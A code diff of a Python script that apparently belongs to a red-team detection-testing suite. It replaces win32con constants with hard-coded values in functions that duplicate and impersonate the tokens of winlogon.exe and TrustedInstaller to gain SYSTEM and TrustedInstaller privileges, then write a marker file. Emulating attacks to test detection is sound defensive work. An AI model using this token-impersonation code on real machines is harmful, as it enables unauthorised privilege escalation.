@@ -6,7 +6,6 @@
 from . import common
 from . import RtaMetadata
 import ctypes, win32gui, win32process, win32event, win32api, win32security, win32file, win32service, sys, time, os
-import win32.lib.win32con as win32con
 
 
 BOOL    = ctypes.c_int
@@ -21,6 +20,10 @@ UCHAR   = ctypes.c_ubyte
 ULONG   = ctypes.c_uint32
 
 TH32CS_SNAPPROCESS = 0x00000002
+PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+TOKEN_DUPLICATE = 0x0002
+TOKEN_ALL_ACCESS = 0xf00ff
+MAX_PATH = 260
 
 BOOL    = ctypes.c_int
 DWORD   = ctypes.c_uint32
@@ -44,7 +47,7 @@ class PROCESSENTRY32(ctypes.Structure):
         ('th32ParentProcessID', DWORD),
         ('pcPriClassBase',      LONG),
         ('dwFlags',             DWORD),
-        ('szExeFile',           TCHAR * win32con.MAX_PATH)
+        ('szExeFile',           TCHAR * MAX_PATH)
     ]
 
 
@@ -70,7 +73,7 @@ def getppid(pname):
     current_pid = os.getpid()
     
 
-    if Process32First(hProcessSnap, ctypes.byref(pe32)) == win32con.FALSE: 
+    if Process32First(hProcessSnap, ctypes.byref(pe32)) == 0:
      print("[x] - Failed getting first process.") 
      return
    
@@ -95,9 +98,9 @@ def startsvc_trustedinstaller():
            pass
 def impersonate_system(): 
      try: 
-        hp = win32api.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, win32con.FALSE, getppid("winlogon.exe")) 
-        th = win32security.OpenProcessToken(hp, win32con.TOKEN_DUPLICATE) 
-        new_tokenh = win32security.DuplicateTokenEx(th, 2, win32con.TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())        
+        hp = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, getppid("winlogon.exe"))
+        th = win32security.OpenProcessToken(hp, TOKEN_DUPLICATE)
+        new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
         win32security.ImpersonateLoggedOnUser(new_tokenh)
         print('[*] - Impersonated System Token via Winlogon')
         win32api.CloseHandle(hp)
@@ -106,12 +109,12 @@ def impersonate_system():
 
 def impersonate_trusted_installer():
     try:
-        hp = win32api.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, win32con.FALSE, getppid("TrustedInstaller.exe")) 
-        th = win32security.OpenProcessToken(hp, win32con.TOKEN_ALL_ACCESS) 
-        new_tokenh = win32security.DuplicateTokenEx(th, 2, win32con.TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())        
+        hp = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, getppid("TrustedInstaller.exe"))
+        th = win32security.OpenProcessToken(hp, TOKEN_ALL_ACCESS)
+        new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
         win32security.ImpersonateLoggedOnUser(new_tokenh) 
         print('[*] - Impersonated TrustedInstaller service')
-        hf = win32file.CreateFile("rta_ti.txt", win32file.GENERIC_WRITE, 0, None, win32con.CREATE_ALWAYS, 0, None) 
+        hf = win32file.CreateFile("rta_ti.txt", win32file.GENERIC_WRITE, 0, None, 2, 0, None)
         win32file.WriteFile(hf,("AAAAAAAA").encode()) 
         win32file.CloseHandle(hf)
         win32api.CloseHandle(hp)
